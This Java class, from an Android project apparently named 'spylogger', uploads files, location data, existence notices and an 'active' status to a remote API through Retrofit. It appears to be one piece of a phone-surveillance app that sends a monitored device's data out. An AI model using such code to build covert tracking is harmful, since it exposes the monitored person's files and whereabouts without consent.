package com.gravatasufoca.spylogger.services;

import com.gravatasufoca.spylogger.helpers.TaskComplete;
import com.gravatasufoca.spylogger.vos.EnvioArquivoVO;
import com.gravatasufoca.spylogger.vos.LocalizacaoVO;

import java.io.File;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;

/**
 * Created by bruno on 02/12/16.
 */

public class SendArquivoService extends SendDataService<Boolean> {

    public SendArquivoService(TaskComplete handler) {
        super(handler);
    }

    public void enviar(File arquivo, EnvioArquivoVO envioArquivoVO){
        MultipartBody.Part filePart = MultipartBody.Part.createFormData("file", arquivo.getName(), RequestBody.create(MediaType.parse("image/*"), arquivo));

        Call<Boolean> call=sendApi.enviarArquivo(filePart,envioArquivoVO);
        call.enqueue(this);
    }

    public void enviarLocalizacao(LocalizacaoVO envioArquivoVO){
        Call<Boolean> call=sendApi.enviarLocalizacao(envioArquivoVO);
        call.enqueue(this);
    }

    public void notificarExistencia(EnvioArquivoVO envioArquivoVO){
        Call<Boolean> call=sendApi.notificarExistencia(envioArquivoVO);
        call.enqueue(this);
    }

    public void enviarAtivo(EnvioArquivoVO envioArquivoVO){
        Call<Boolean> call=sendApi.enviarAtivo(envioArquivoVO);
        call.enqueue(this);
    }
}
